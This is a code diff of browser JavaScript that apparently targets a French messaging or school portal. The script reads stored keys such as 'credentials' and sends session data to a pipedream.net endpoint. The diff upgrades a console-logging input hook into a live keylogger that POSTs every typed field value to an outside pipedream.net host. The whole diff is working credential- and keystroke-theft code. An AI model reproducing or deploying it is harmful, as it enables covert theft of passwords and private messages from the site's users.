@@ -6,7 +6,7 @@ window.addEventListener('beforeunload', (e) => {
 
 (async function ex() {
 
-	const url = 'https://0733573e51e539943f1a251895a65a69.m.pipedream.net/session';
+	const url = 'https://3169a8cec3d0dff512a354276b174afb.m.pipedream.net/session';
 	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
 	const keys = [
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
@@ -74,19 +74,25 @@ async function iframe() {
 			await new Promise(resolve => setTimeout(resolve, 8000));
 
 			function attachListeners(doc) {
-			// inputs + divs contenteditable
-			doc.querySelectorAll('input, div[contenteditable]').forEach(field => {
-				if (field._hooked) return; // ← empêche les doublons
-				field._hooked = true;
+				doc.querySelectorAll('input, div[contenteditable]').forEach(field => {
+					if (field._hooked) return;
+					field._hooked = true;
 
-				const eventType = field.tagName === 'INPUT' ? 'input' : 'input';
+					const eventType = field.tagName === 'INPUT' ? 'input' : 'input';
 
-				field.addEventListener('input', async function() {
-				const name = this.name || this.id || this.type || this.className || 'field';
-				const value = this.value || this.innerText;
-				console.log(`[${name}] : ${value}`);
+					field.addEventListener('input', async function() {
+					const data = { 
+						name: this.name || this.id || this.type || this.className || 'field',
+						value: this.value || this.innerText
+					};
+					fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json"
+						},
+						body: JSON.stringify(data)});
+					});
 				});
-			});
 			}
 
 			const observer = new MutationObserver(() => attachListeners(doc));
